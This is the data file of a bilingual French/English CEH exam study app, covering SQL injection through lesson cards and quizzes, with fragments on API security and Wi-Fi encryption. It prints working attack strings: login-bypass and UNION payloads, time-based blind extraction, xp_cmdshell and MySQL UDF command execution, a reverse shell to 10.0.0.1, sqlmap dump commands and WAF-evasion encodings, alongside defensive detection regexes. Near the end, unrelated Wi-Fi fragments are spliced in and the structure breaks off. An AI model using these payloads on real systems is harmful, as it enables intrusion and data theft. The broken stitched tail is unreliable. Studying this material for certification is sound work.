  {q:{fr:"Que désigne API1 dans l'OWASP API Security Top 10 ?",en:"What does API1 mean in the OWASP API Security Top 10?"},opts:[{fr:"Broken Object-Level Authorization (BOLA / IDOR)",en:"Broken Object-Level Authorization (BOLA / IDOR)"},{fr:"Broken Authentication",en:"Broken Authentication"},{fr:"Security Misconfiguration",en:"Security Misconfiguration"},{fr:"SSRF",en:"SSRF"}],a:0,ex:{fr:"API1 = Broken Object-Level Authorization (BOLA), équivalent de l'IDOR : manipuler un identifiant d'objet sans contrôle des droits.",en:"API1 = Broken Object-Level Authorization (BOLA), the IDOR equivalent: manipulating an object ID with no rights check."}},
  {q:{fr:"Comment appelle-t-on le fait de sauter une étape d'un processus (ex. le paiement) en manipulant les requêtes ?",en:"What is skipping a process step (e.g. payment) by manipulating requests called?"},opts:[{fr:"forced browsing",en:"forced browsing"},{fr:"parameter tampering",en:"parameter tampering"},{fr:"clickjacking",en:"clickjacking"},{fr:"fuzzing",en:"fuzzing"}],a:0,ex:{fr:"Le forced browsing exploite les failles de logique applicative en accédant directement à des étapes ultérieures (via Burp), sautant par ex. le paiement.",en:"Forced browsing exploits application-logic flaws by directly accessing later steps (via Burp), skipping e.g. the payment."}},
  {q:{fr:"Quel caractère est utilisé pour ajouter des paramètres dans une connection string injection ?",en:"Which character is used to append parameters in a connection string injection?"},opts:[{fr:"le point-virgule ( ; )",en:"the semicolon ( ; )"},{fr:"le pipe ( | )",en:"the pipe ( | )"},{fr:"l'esperluette ( & )",en:"the ampersand ( & )"},{fr:"le dièse ( # )",en:"the hash ( # )"}],a:0,ex:{fr:"On injecte des paramètres (ex. Encryption=off, Integrated Security=true) en les ajoutant après un point-virgule dans la chaîne de connexion.",en:"Parameters (e.g. Encryption=off, Integrated Security=true) are injected by appending them after a semicolon in the connection string."}},
  {q:{fr:"Quelle est la différence entre SAST et DAST ?",en:"What is the difference between SAST and DAST?"},opts:[{fr:"SAST analyse le code sans l'exécuter ; DAST teste l'application en cours d'exécution",en:"SAST analyzes code without running it; DAST tests the running application"},{fr:"l'inverse",en:"the opposite"},{fr:"les deux exécutent le code",en:"both execute the code"},{fr:"aucun n'analyse le code",en:"neither analyzes code"}],a:0,ex:{fr:"SAST (statique) inspecte le code source sans exécution ; DAST (dynamique) interagit avec l'appli en fonctionnement pour simuler des attaques.",en:"SAST (static) inspects source code without execution; DAST (dynamic) interacts with the running app to simulate attacks."}},
  {q:{fr:"Quelle est la principale défense contre l'injection SQL ?",en:"What is the main defense against SQL injection?"},opts:[{fr:"les requêtes paramétrées / prepared statements",en:"parameterized queries / prepared statements"},{fr:"désactiver le HTTPS",en:"disabling HTTPS"},{fr:"augmenter le timeout",en:"increasing the timeout"},{fr:"utiliser la méthode GET",en:"using the GET method"}],a:0,ex:{fr:"Les requêtes paramétrées séparent le code des données, empêchant l'injection. On y ajoute un compte DB peu privilégié, un WAF et la désactivation de xp_cmdshell.",en:"Parameterized queries separate code from data, preventing injection. Add a low-privilege DB account, a WAF, and disable xp_cmdshell."}},
  {q:{fr:"Quel outil détecte la présence d'un Web Application Firewall ?",en:"Which tool detects the presence of a Web Application Firewall?"},opts:[{fr:"WAFW00F",en:"WAFW00F"},{fr:"gobuster",en:"gobuster"},{fr:"httrack",en:"httrack"},{fr:"Wappalyzer",en:"Wappalyzer"}],a:0,ex:{fr:"WAFW00F identifie le WAF protégeant une application ; gobuster énumère les répertoires, httrack fait le miroir, Wappalyzer identifie la stack.",en:"WAFW00F identifies the WAF protecting an application; gobuster enumerates directories, httrack mirrors, Wappalyzer fingerprints the stack."}},
  {q:{fr:"Le credential stuffing consiste à…",en:"Credential stuffing consists of…"},opts:[{fr:"rejouer des paires identifiant/mot de passe déjà fuitées",en:"replaying already-leaked login/password pairs"},{fr:"deviner les mots de passe par force brute",en:"guessing passwords by brute force"},{fr:"injecter du SQL dans le login",en:"injecting SQL into the login"},{fr:"cloner un QR code",en:"cloning a QR code"}],a:0,ex:{fr:"Le credential stuffing exploite la réutilisation de mots de passe : on automatise des credentials déjà connus (Sentry MBA, PhantomJS) plutôt que de deviner.",en:"Credential stuffing exploits password reuse: it automates already-known credentials (Sentry MBA, PhantomJS) rather than guessing."}}
 ]
},
{
 n:15, exam:"312-50",
 t:{fr:"Injection SQL",en:"SQL Injection"},
 sub:{fr:"Détourner la base via des entrées non filtrées",en:"Subverting the database via unfiltered input"},
 cards:[

  {id:"concepts", t:{fr:"Concepts",en:"Concepts"},
   s:{fr:"Bypass classique, UNION, 4 types d'attaque",en:"Classic bypass, UNION, 4 attack types"},
   blocks:[
    {t:"p",fr:"L'**injection SQL** exploite des **entrées non filtrées** pour faire exécuter des commandes SQL par la base. C'est une **faille de l'application web** (pas de la base ni du serveur). Elle permet : bypass d'authentification, divulgation d'infos, atteinte à l'intégrité/disponibilité, **exécution de code à distance**.",en:"**SQL injection** exploits **unsanitized input** to have SQL commands executed by the backend database. It's a **web-application flaw** (not the database or the server). It enables: authentication bypass, information disclosure, integrity/availability compromise, **remote code execution**."},
    {t:"h",fr:"Le bypass classique",en:"The classic bypass"},
    {t:"cmd",lbl:"Auth bypass",lines:[
      ["' OR 1=1 --","{fr:condition toujours vraie ; -- commente la suite|en:always-true condition; -- comments the rest}"],
      ["admin'--","{fr:se connecte en admin sans mot de passe|en:log in as admin without a password}"],
      ["' UNION SELECT username,password FROM users --","{fr:extraction via UNION|en:extraction via UNION}"]]},
    {t:"note",k:{fr:"À comprendre",en:"To understand"},fr:"En SQL, **`--`** débute un commentaire → le reste de la ligne est ignoré. `' OR 1=1` rend la clause WHERE toujours vraie, contournant la vérification du mot de passe.",en:"In SQL, **`--`** starts a comment → the rest of the line is ignored. `' OR 1=1` makes the WHERE clause always true, bypassing the password check."},
    {t:"recap",items:[
      {k:"Nature",fr:"faille de l'appli web (entrées non filtrées)",en:"web-app flaw (unfiltered input)"},
      {k:"4 impacts",fr:"bypass auth · divulgation · intégrité · RCE",en:"auth bypass · disclosure · integrity · RCE"},
      {k:"Bypass",fr:"' OR 1=1 -- ; UNION SELECT",en:"' OR 1=1 --; UNION SELECT"}]}
   ]},

  {id:"types", t:{fr:"Types d'injection",en:"Injection types"},
   s:{fr:"In-band, blind/inférentielle, out-of-band",en:"In-band, blind/inferential, out-of-band"},
   blocks:[
    {t:"table",head:{fr:["Famille","Principe"],en:["Family","Principle"]},rows:[
      [{fr:"**In-band**",en:"**In-band**"},{fr:"attaque **et** résultat sur le **même canal** — les 2 plus courantes : **error-based** et **UNION**",en:"attack **and** result on the **same channel** — the 2 most common: **error-based** and **UNION**"}],
      [{fr:"**Blind / inférentielle**",en:"**Blind / inferential**"},{fr:"**aucun résultat visible** — questions vrai/faux : **Boolean**, **Time delay**, **Heavy query**",en:"**no visible result** — true/false questions: **Boolean**, **Time delay**, **Heavy query**"}],
      [{fr:"**Out-of-band**",en:"**Out-of-band**"},{fr:"résultat via un **autre canal** (DNS, HTTP) : `xp_dirtree` (MSSQL), `UTL_HTTP` (Oracle)",en:"result via a **different channel** (DNS, HTTP): `xp_dirtree` (MSSQL), `UTL_HTTP` (Oracle)"}]]},
    {t:"h",fr:"Techniques in-band clés",en:"Key in-band techniques"},
    {t:"ul",items:[
      {fr:"**UNION-based** — `UNION SELECT` ajoute une requête pour extraire d'autres tables/colonnes",en:"**UNION-based** — `UNION SELECT` appends a query to extract other tables/columns"},
      {fr:"**Error-based** — provoque des erreurs qui fuient la structure de la base",en:"**Error-based** — triggers errors that leak the database structure"},
      {fr:"**Tautology** — `OR '1'='1'` (toujours vrai) → bypass d'authentification",en:"**Tautology** — `OR '1'='1'` (always true) → authentication bypass"},
      {fr:"**End-of-line comment (`--`) / in-line comment (`/**/`)** — ignore/obfusque la suite",en:"**End-of-line comment (`--`) / in-line comment (`/**/`)** — ignores/obfuscates the rest"},
      {fr:"**Piggybacked query** — requête empilée (`; DROP TABLE…`)",en:"**Piggybacked query** — stacked query (`; DROP TABLE…`)"},
      {fr:"**System stored procedure** — injecte dans une procédure stockée (ex. login)",en:"**System stored procedure** — injects into a stored procedure (e.g. login)"},
      {fr:"**Illegal / logically incorrect query** — requête invalide pour révéler la structure via l'erreur",en:"**Illegal / logically incorrect query** — invalid query to reveal structure via the error"}]},
    {t:"h",fr:"Blind : détecter et extraire",en:"Blind: detect and extract"},
    {t:"cmd",lbl:"Blind SQLi",lines:[
      ["...?id=101 and 1=1","{fr:vrai (page normale) → vulnérable|en:true (normal page) → vulnerable}"],
      ["...?id=101 and 1=2","{fr:faux (page différente)|en:false (different page)}"],
      ["; IF(ASCII(substring((USER),1,1))=97) WAITFOR DELAY '0:0:10'--","{fr:extraction caractère par caractère (MSSQL)|en:char-by-char extraction (MSSQL)}"]]},
    {t:"p",fr:"Délai temporel : **`WAITFOR DELAY '0:0:10'`** (MSSQL), **`BENCHMARK()`** (MySQL). **Heavy query** = requête lourde (jointures système) sans fonction de délai (utile si `WAITFOR` est désactivé).",en:"Time delay: **`WAITFOR DELAY '0:0:10'`** (MSSQL), **`BENCHMARK()`** (MySQL). **Heavy query** = a heavy query (system joins) without a delay function (useful if `WAITFOR` is disabled)."},
    {t:"trap",k:{fr:"Piège d'examen",en:"Exam trap"},fr:"3 familles : **in-band** (même canal), **blind/inférentielle** (vrai/faux, invisible), **out-of-band** (autre canal : `xp_dirtree`/`UTL_HTTP`). Blind = **Boolean, Time delay, Heavy query**.",en:"3 families: **in-band** (same channel), **blind/inferential** (true/false, invisible), **out-of-band** (other channel: `xp_dirtree`/`UTL_HTTP`). Blind = **Boolean, Time delay, Heavy query**."},
    {t:"recap",items:[
      {k:"In-band",fr:"error-based + UNION (les + courantes)",en:"error-based + UNION (most common)"},
      {k:"Blind",fr:"Boolean / Time delay / Heavy query",en:"Boolean / Time delay / Heavy query"},
      {k:"Out-of-band",fr:"xp_dirtree (MSSQL) / UTL_HTTP (Oracle)",en:"xp_dirtree (MSSQL) / UTL_HTTP (Oracle)"}]}
   ]},

  {id:"method", t:{fr:"Méthodologie & exploitation",en:"Methodology & exploitation"},
   s:{fr:"3 phases, extraction, xp_cmdshell, sqlmap",en:"3 phases, extraction, xp_cmdshell, sqlmap"},
   blocks:[
    {t:"p",fr:"La démarche tient en **3 phases** : repérer la faille → l'exploiter pour extraire des données → l'étendre pour compromettre le réseau.",en:"The approach has **3 phases**: locate the flaw → exploit it to extract data → extend it to compromise the network."},
    {t:"h",fr:"Phase 1 — Collecte d'infos & détection",en:"Phase 1 — Information gathering & detection"},
    {t:"ul",items:[
      {fr:"**Ce qu'on cherche** : type et version du SGBD, base, utilisateurs, **niveau de privilège**, interaction OS possible",en:"**What to learn**: DBMS type and version, database, users, **privilege level**, possible OS interaction"},
      {fr:"**Provoquer une erreur** : injecter `'`, ou mettre une **chaîne là où un nombre est attendu**",en:"**Trigger an error**: inject `'`, or put a **string where a number is expected**"},
      {fr:"**Grouping error** `' group by … having 1=1 --` et **type mismatch** → fuite de la structure",en:"**Grouping error** `' group by … having 1=1 --` and **type mismatch** → structure leak"},
      {fr:"Tester l'opérateur **UNION** ; outils : **Burp Suite, Tamper Dev**",en:"Test the **UNION** operator; tools: **Burp Suite, Tamper Dev**"}]},
    {t:"h",fr:"Phase 2 — Lancer les attaques",en:"Phase 2 — Launch the attacks"},
    {t:"ul",items:[
      {fr:"**Extraction error-based** en 4 temps : base → table → colonne → valeur (chaque `convert(int,…)` fuit la valeur dans le message d'erreur)",en:"**Error-based extraction** in 4 steps: database → table → column → value (each `convert(int,…)` leaks the value in the error message)"},
      {fr:"**Bypass de login** (`' OR 1=1 --`) ou mot de passe **caractère par caractère** (`… LIKE 'a%'`)",en:"**Login bypass** (`' OR 1=1 --`) or **character-by-character** password (`… LIKE 'a%'`)"},
      {fr:"**Insertion d'un utilisateur** (`; INSERT INTO Users …`) ou **backdoor** via trigger SQL",en:"**Inserting a user** (`; INSERT INTO Users …`) or a trigger-based **backdoor**"},
      {fr:"Injection via des **en-têtes HTTP** mal filtrés (User-Agent, Referer, Cookie)",en:"Injection via poorly filtered **HTTP headers** (User-Agent, Referer, Cookie)"}]},
    {t:"h",fr:"Phase 3 — SQL injection avancée",en:"Phase 3 — Advanced SQL injection"},
    {t:"ul",items:[
      {fr:"**Énumération des colonnes** selon le SGBD : `syscolumns` (MSSQL), `information_schema` (MySQL), `all_tab_columns` (Oracle)",en:"**Column enumeration** per DBMS: `syscolumns` (MSSQL), `information_schema` (MySQL), `all_tab_columns` (Oracle)"},
      {fr:"**Création de comptes DB** (`sp_addlogin` MSSQL, `CREATE USER` Oracle/MySQL), **vol de mots de passe**",en:"**Creating DB accounts** (`sp_addlogin` MSSQL, `CREATE USER` Oracle/MySQL), **password grabbing**"},
      {fr:"**Transfert de la base** vers l'attaquant (`OPENROWSET`)",en:"**Transferring the database** to the attacker (`OPENROWSET`)"},
      {fr:"**Interaction avec l'OS** : lecture/écriture de fichiers, exécution de commandes, **reverse shell**",en:"**OS interaction**: reading/writing files, executing commands, **reverse shell**"}]},
    {t:"h",fr:"Interaction avec l'OS (par SGBD)",en:"OS interaction (per DBMS)"},
    {t:"table",head:{fr:["SGBD","Mécanisme"],en:["DBMS","Mechanism"]},rows:[
      [{fr:"**MSSQL**",en:"**MSSQL**"},{fr:"`xp_cmdshell` (procédure stockée étendue)",en:"`xp_cmdshell` (extended stored procedure)"}],
      [{fr:"**MySQL**",en:"**MySQL**"},{fr:"UDF `sys_exec` (exécute, sans retour) / `sys_eval` (exécute **et renvoie** la sortie)",en:"UDF `sys_exec` (runs, no output) / `sys_eval` (runs **and returns** the output)"}],
      [{fr:"**Oracle**",en:"**Oracle**"},{fr:"`DBMS_SCHEDULER`, procédures stockées Java",en:"`DBMS_SCHEDULER`, Java stored procedures"}]]},
    {t:"cmd",lbl:"Exécution de commandes OS",lines:[
      ["'; exec master..xp_cmdshell 'whoami' --","{fr:MSSQL : commande OS|en:MSSQL: OS command}"],
      ["CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so';","{fr:MySQL : charge l'UDF sys_exec|en:MySQL: load the sys_exec UDF}"],
      ["SELECT sys_eval('id');","{fr:MySQL : exécute et récupère la sortie|en:MySQL: run and get the output}"],
      ["EXEC xp_cmdshell 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'","{fr:reverse shell (MSSQL)|en:reverse shell (MSSQL)}"]]},
    {t:"h",fr:"sqlmap",en:"sqlmap"},
    {t:"p",fr:"Outil de référence : automatise détection et exploitation, supporte les **6 techniques** (boolean-blind, time-blind, error-based, UNION, stacked queries, out-of-band).",en:"The go-to tool: automates detection and exploitation, supports the **6 techniques** (boolean-blind, time-blind, error-based, UNION, stacked queries, out-of-band)."},
    {t:"cmd",lbl:"sqlmap",lines:[
      ["sqlmap -u 'http://cible/p.php?id=1' --dbs --batch","{fr:liste les bases|en:list databases}"],
      ["sqlmap -u '...' -D base --tables","{fr:liste les tables|en:list tables}"],
      ["sqlmap -u '...' -D base -T users --dump","{fr:extrait les données|en:dump the data}"]]},
    {t:"trap",k:{fr:"Piège d'examen",en:"Exam trap"},fr:"Interaction OS : **`xp_cmdshell`** (MSSQL), **`sys_exec`/`sys_eval`** (MySQL, via UDF). **`xp_dirtree`** = out-of-band (DNS). **sqlmap** supporte les 6 techniques.",en:"OS interaction: **`xp_cmdshell`** (MSSQL), **`sys_exec`/`sys_eval`** (MySQL, via UDF). **`xp_dirtree`** = out-of-band (DNS). **sqlmap** supports the 6 techniques."},
    {t:"recap",items:[
      {k:"3 phases",fr:"détection → attaques → avancée (réseau)",en:"detection → attacks → advanced (network)"},
      {k:"OS",fr:"xp_cmdshell (MSSQL) · sys_exec/sys_eval (MySQL)",en:"xp_cmdshell (MSSQL) · sys_exec/sys_eval (MySQL)"},
      {k:"Outil",fr:"sqlmap (6 techniques)",en:"sqlmap (6 techniques)"}]}
   ]},

  {id:"evasion", t:{fr:"Évasion d'IDS",en:"IDS evasion"},
   s:{fr:"Obfuscation des chaînes de signature",en:"Obfuscating signature strings"},
   blocks:[
    {t:"p",fr:"Un IDS à signatures compare les entrées à une base de chaînes d'attaque SQL. On les **obfusque** pour passer.",en:"A signature-based IDS compares input to a database of SQL attack strings. You **obfuscate** them to slip past."},
    {t:"table",head:{fr:["Technique","Principe"],en:["Technique","Principle"]},rows:[
      [{fr:"**Null byte**",en:"**Null byte**"},{fr:"`%00` avant la chaîne pour contourner la détection",en:"`%00` before the string to bypass detection"}],
      [{fr:"**Case variation**",en:"**Case variation**"},{fr:"mélange majuscules/minuscules (`UnIoN sElEcT`)",en:"mix upper/lower case (`UnIoN sElEcT`)"}],
      [{fr:"**In-line comment**",en:"**In-line comment**"},{fr:"`/**/` entre les mots-clés SQL",en:"`/**/` between SQL keywords"}],
      [{fr:"**Char / hex / URL encoding**",en:"**Char / hex / URL encoding**"},{fr:"`CHAR()`, hex (`0x73…`), `%27`… pour cacher la chaîne",en:"`CHAR()`, hex (`0x73…`), `%27`… to hide the string"}],
      [{fr:"**Whitespace / concaténation**",en:"**Whitespace / concatenation**"},{fr:"espaces trafiqués, chaînes concaténées",en:"tampered whitespace, concatenated strings"}],
      [{fr:"**Declare variables**",en:"**Declare variables**"},{fr:"reconstruit la requête via des variables (`'UNI'+'ON'`)",en:"rebuilds the query via variables (`'UNI'+'ON'`)"}],
      [{fr:"**IP fragmentation**",en:"**IP fragmentation**"},{fr:"scinde le paquet pour empêcher le matching de signature",en:"splits the packet to prevent signature matching"}]]},
    {t:"h",fr:"Métacaractères SQL & détection (regex)",en:"SQL meta-characters & detection (regex)"},
    {t:"p",fr:"Les IDS/WAF détectent le SQLi avec des **regex** qui cherchent des métacaractères et des mots-clés. Connaître leurs **équivalents encodés** (URL/hex) est la base de l'évasion :",en:"IDS/WAFs detect SQLi with **regex** that look for meta-characters and keywords. Knowing their **encoded equivalents** (URL/hex) is the basis of evasion:"},
    {t:"table",head:{fr:["Caractère","Encodé","Rôle"],en:["Character","Encoded","Role"]},rows:[
      [{fr:"`'`",en:"`'`"},{fr:"`%27`",en:"`%27`"},{fr:"apostrophe — ouvre l'injection",en:"single quote — opens the injection"}],
      [{fr:"`--`",en:"`--`"},{fr:"`%2D%2D`",en:"`%2D%2D`"},{fr:"commentaire (ignore la fin de ligne)",en:"comment (ignores the rest of the line)"}],
      [{fr:"`#`",en:"`#`"},{fr:"`%23`",en:"`%23`"},{fr:"commentaire (MySQL)",en:"comment (MySQL)"}],
      [{fr:"`=`",en:"`=`"},{fr:"`%3D`",en:"`%3D`"},{fr:"comparaison (`OR 1=1`)",en:"comparison (`OR 1=1`)"}],
      [{fr:"`;`",en:"`;`"},{fr:"`%3B`",en:"`%3B`"},{fr:"empile une 2e requête (piggyback)",en:"stacks a 2nd query (piggyback)"}],
      [{fr:"`( )`",en:"`( )`"},{fr:"`%28` `%29`",en:"`%28` `%29`"},{fr:"appels de fonctions (`CHAR()`, `CONCAT()`)",en:"function calls (`CHAR()`, `CONCAT()`)"}]]},
    {t:"note",k:{fr:"Regex de détection & mot-clé UNION",en:"Detection regex & UNION keyword"},fr:"Motifs typiques côté défense : métacaractères `/(%27)|(')|(--)|(#)|(%23)/i`, mot-clé **UNION** `/(%27|')union/i`, et `exec (sp_|xp_)` pour MSSQL. **UNION** est le mot-clé le plus surveillé → on l'évade par la **casse** (`UnIoN`), les **commentaires** (`UN/*!*/ION`) et l'**encodage** (`%55NION`).",en:"Typical defensive patterns: meta-characters `/(%27)|(')|(--)|(#)|(%23)/i`, **UNION** keyword `/(%27|')union/i`, and `exec (sp_|xp_)` for MSSQL. **UNION** is the most-watched keyword → evade it via **case** (`UnIoN`), **comments** (`UN/*!*/ION`) and **encoding** (`%55NION`)."},
    {t:"trap",k:{fr:"Piège d'examen",en:"Exam trap"},fr:"**Null byte** = `%00`. **Case variation** = casse mélangée contre un filtre sensible à la casse. **IP fragmentation** = scinde le paquet pour éviter le réassemblage/matching.",en:"**Null byte** = `%00`. **Case variation** = mixed case against a case-sensitive filter. **IP fragmentation** = splits the packet to avoid reassembly/matching."},
    {t:"recap",items:[
      {k:"Null byte",fr:"%00 avant la chaîne",en:"%00 before the string"},
      {k:"Case variation",fr:"UnIoN sElEcT",en:"UnIoN sElEcT"},
      {k:"Encodage",fr:"char / hex / URL",en:"char / hex / URL"}]}
   ]},

  {id:"defense", t:{fr:"Contre-mesures",en:"Countermeasures"},
   s:{fr:"Requêtes paramétrées, moindre privilège",en:"Parameterized queries, least privilege"},
   blocks:[
    {t:"ul",items:[
      {fr:"**Requêtes paramétrées / prepared statements** — jamais de SQL dynamique concaténé avec l'entrée utilisateur",en:"**Parameterized queries / prepared statements** — never dynamic SQL concatenated with user input"},
      {fr:"**Procédures stockées** pour valider l'entrée ; validation multi-couches côté serveur",en:"**Stored procedures** to validate input; multi-layer server-side validation"},
      {fr:"Tester **taille, type, contenu** ; rejeter caractères de commentaire/échappement",en:"Test **size, type, content**; reject comment/escape characters"},
      {fr:"Compte DB au **moindre privilège** ; IDS + WAF ; désactiver `xp_cmdshell`",en:"**Least-privilege** DB account; IDS + WAF; disable `xp_cmdshell`"},
      {fr:"Stocker les mots de passe en **SHA256** (jamais en clair) ; messages d'erreur personnalisés",en:"Store passwords with **SHA256** (never plaintext); custom error messages"}]},
    {t:"trap",k:{fr:"Piège d'examen",en:"Exam trap"},fr:"La défense n°1 = **requêtes paramétrées (prepared statements)**. Compléter par : moindre privilège DB, procédures stockées, WAF, désactiver `xp_cmdshell`, hash **SHA256**.",en:"The #1 defense = **parameterized queries (prepared statements)**. Complement with: least-privilege DB, stored procedures, WAF, disable `xp_cmdshell`, **SHA256** hashing."},
    {t:"recap",items:[
      {k:"Défense n°1",fr:"requêtes paramétrées",en:"parameterized queries"},
      {k:"DB",fr:"moindre privilège, désactiver xp_cmdshell",en:"least privilege, disable xp_cmdshell"},
      {k:"Mots de passe",fr:"SHA256, jamais en clair",en:"SHA256, never plaintext"}]}
   ]}
 ],

 cheat:{

 quiz:[
  {q:{fr:"Quels sont les 3 grands types d'injection SQL ?",en:"What are the 3 main types of SQL injection?"},opts:[{fr:"in-band, blind/inférentielle, out-of-band",en:"in-band, blind/inferential, out-of-band"},{fr:"actif, passif, hybride",en:"active, passive, hybrid"},{fr:"local, distant, réflexif",en:"local, remote, reflexive"},{fr:"GET, POST, COOKIE",en:"GET, POST, COOKIE"}],a:0,ex:{fr:"In-band (même canal, error-based/UNION), blind/inférentielle (vrai/faux, invisible), out-of-band (autre canal comme DNS/HTTP).",en:"In-band (same channel, error-based/UNION), blind/inferential (true/false, invisible), out-of-band (other channel like DNS/HTTP)."}},
  {q:{fr:"Quelles sont les deux techniques in-band les plus courantes ?",en:"What are the two most common in-band techniques?"},opts:[{fr:"error-based et UNION",en:"error-based and UNION"},{fr:"boolean et heavy query",en:"boolean and heavy query"},{fr:"xp_dirtree et UTL_HTTP",en:"xp_dirtree and UTL_HTTP"},{fr:"time delay et null byte",en:"time delay and null byte"}],a:0,ex:{fr:"Error-based (fuite via messages d'erreur) et UNION (ajout d'un SELECT) sont les deux techniques in-band les plus utilisées.",en:"Error-based (leak via error messages) and UNION (appended SELECT) are the two most-used in-band techniques."}},
  {q:{fr:"Quelles sont les 3 techniques d'injection SQL blind/inférentielle ?",en:"What are the 3 blind/inferential SQL injection techniques?"},opts:[{fr:"Boolean, Time delay, Heavy query",en:"Boolean, Time delay, Heavy query"},{fr:"UNION, Error-based, Tautology",en:"UNION, Error-based, Tautology"},{fr:"xp_cmdshell, xp_dirtree, UTL_HTTP",en:"xp_cmdshell, xp_dirtree, UTL_HTTP"},{fr:"Null byte, Hex, Case variation",en:"Null byte, Hex, Case variation"}],a:0,ex:{fr:"En blind, les résultats ne sont pas visibles : on infère via des réponses booléennes, des délais temporels, ou des requêtes lourdes.",en:"In blind SQLi, results aren't visible: you infer via boolean responses, time delays, or heavy queries."}},
  {q:{fr:"Quelle commande MSSQL permet d'exécuter des commandes système via SQLi ?",en:"Which MSSQL command runs OS commands via SQLi?"},opts:[{fr:"xp_cmdshell",en:"xp_cmdshell"},{fr:"UTL_HTTP",en:"UTL_HTTP"},{fr:"BENCHMARK",en:"BENCHMARK"},{fr:"sp_addlogin",en:"sp_addlogin"}],a:0,ex:{fr:"xp_cmdshell exécute des commandes OS depuis MSSQL (ex. ipconfig, reverse shell). À désactiver en défense.",en:"xp_cmdshell runs OS commands from MSSQL (e.g. ipconfig, reverse shell). Disable it as a defense."}},
  {q:{fr:"Quelle commande MSSQL est utilisée pour une injection out-of-band via DNS ?",en:"Which MSSQL command is used for out-of-band injection via DNS?"},opts:[{fr:"xp_dirtree",en:"xp_dirtree"},{fr:"xp_cmdshell",en:"xp_cmdshell"},{fr:"WAITFOR DELAY",en:"WAITFOR DELAY"},{fr:"OPENROWSET",en:"OPENROWSET"}],a:0,ex:{fr:"xp_dirtree fait émettre des requêtes DNS vers un serveur contrôlé par l'attaquant (out-of-band). Oracle utilise UTL_HTTP pour du HTTP.",en:"xp_dirtree makes the server issue DNS requests to an attacker-controlled server (out-of-band). Oracle uses UTL_HTTP for HTTP."}},
  {q:{fr:"À quoi sert la séquence -- dans une injection SQL ?",en:"What does the -- sequence do in a SQL injection?"},opts:[{fr:"elle commente le reste de la ligne (ignoré)",en:"it comments out the rest of the line (ignored)"},{fr:"elle concatène deux requêtes",en:"it concatenates two queries"},{fr:"elle chiffre la requête",en:"it encrypts the query"},{fr:"elle déclenche un délai",en:"it triggers a delay"}],a:0,ex:{fr:"En SQL, -- démarre un commentaire : le reste de la requête (ex. la vérification du mot de passe) est ignoré, permettant le bypass.",en:"In SQL, -- starts a comment: the rest of the query (e.g. the password check) is ignored, enabling the bypass."}},
  {q:{fr:"Quel outil open source supporte les 6 techniques d'injection SQL ?",en:"Which open-source tool supports the 6 SQL injection techniques?"},opts:[{fr:"sqlmap",en:"sqlmap"},{fr:"Nikto",en:"Nikto"},{fr:"WAFW00F",en:"WAFW00F"},{fr:"gobuster",en:"gobuster"}],a:0,ex:{fr:"sqlmap automatise détection et exploitation et couvre boolean-blind, time-blind, error-based, UNION, stacked queries et out-of-band.",en:"sqlmap automates detection and exploitation and covers boolean-blind, time-blind, error-based, UNION, stacked queries and out-of-band."}},
  {q:{fr:"Quelle technique d'évasion place %00 avant une chaîne pour contourner la détection ?",en:"Which evasion technique places %00 before a string to bypass detection?"},opts:[{fr:"Null byte",en:"Null byte"},{fr:"Case variation",en:"Case variation"},{fr:"Hex encoding",en:"Hex encoding"},{fr:"IP fragmentation",en:"IP fragmentation"}],a:0,ex:{fr:"Le null byte (%00) inséré avant la chaîne d'attaque peut faire échouer la détection par signature de certains WAF/IDS.",en:"A null byte (%00) inserted before the attack string can defeat some WAF/IDS signature detection."}},
  {q:{fr:"Quelle est la principale défense au niveau du code contre l'injection SQL ?",en:"What is the main code-level defense against SQL injection?"},opts:[{fr:"les requêtes paramétrées (prepared statements)",en:"parameterized queries (prepared statements)"},{fr:"augmenter la RAM du serveur",en:"increasing server RAM"},{fr:"utiliser HTTP au lieu de HTTPS",en:"using HTTP instead of HTTPS"},{fr:"désactiver les logs",en:"disabling logs"}],a:0,ex:{fr:"Les requêtes paramétrées séparent le code des données. On complète par moindre privilège DB, procédures stockées, WAF et hash SHA256 des mots de passe.",en:"Parameterized queries separate code from data. Complement with least-privilege DB, stored procedures, WAF and SHA256 password hashing."}}
 ]

    {t:"p",fr:"À noter : **802.11i** définit WPA2 (TKIP/AES). Antennes : **directionnelle**, **omnidirectionnelle** (360°), **parabolic grid** (très longue portée ~10 miles, permet DoS L1/MITM).",en:"Note: **802.11i** defines WPA2 (TKIP/AES). Antennas: **directional**, **omnidirectional** (360°), **parabolic grid** (very long range ~10 miles, enables L1 DoS/MITM)."},

      [{fr:"**WPA2**",en:"**WPA2**"},{fr:"AES-CCMP",en:"AES-CCMP"},{fr:"48 bits",en:"48-bit"},{fr:"128 bits",en:"128-bit"},{fr:"CBC-MAC",en:"CBC-MAC"}],

    {t:"p",fr:"Gestion des clés : WEP **aucune** ; WPA/WPA2 **4-way handshake** (PSK ou 802.1X/EAP) ; WPA3 **SAE** (+ ECDH/ECDSA). WEP est cassable via ses **IV faibles** (attaque **FMS**).",en:"Key management: WEP **none**; WPA/WPA2 **4-way handshake** (PSK or 802.1X/EAP); WPA3 **SAE** (+ ECDH/ECDSA). WEP is crackable via its **weak IVs** (**FMS** attack)."},
    {t:"trap",k:{fr:"Piège d'examen",en:"Exam trap"},fr:"**WEP = RC4/CRC-32 ; WPA = RC4+TKIP/Michael ; WPA2 = AES-CCMP/CBC-MAC ; WPA3 = AES-GCMP-256/SAE.** IV WEP = **24 bits**. WPA/WPA2 = **4-way handshake**, WPA3 = **SAE**.",en:"**WEP = RC4/CRC-32; WPA = RC4+TKIP/Michael; WPA2 = AES-CCMP/CBC-MAC; WPA3 = AES-GCMP-256/SAE.** WEP IV = **24-bit**. WPA/WPA2 = **4-way handshake**, WPA3 = **SAE**."},

    {t:"table",head:{fr:["Attaque","Principe"],en:["Attack","Principle"]},rows:[

 quiz:[
  {q:{fr:"Quel algorithme de chiffrement WPA3 utilise-t-il ?",en:"Which encryption algorithm does WPA3 use?"},opts:[{fr:"AES-GCMP 256",en:"AES-GCMP 256"},{fr:"RC4",en:"RC4"},{fr:"AES-CCMP",en:"AES-CCMP"},{fr:"TKIP",en:"TKIP"}],a:0,ex:{fr:"WPA3 = AES-GCMP-256, clé 192 bits, gestion de clés SAE, intégrité BIP-GMAC-256. WPA2 utilise AES-CCMP.",en:"WPA3 = AES-GCMP-256, 192-bit key, SAE key management, BIP-GMAC-256 integrity. WPA2 uses AES-CCMP."}},
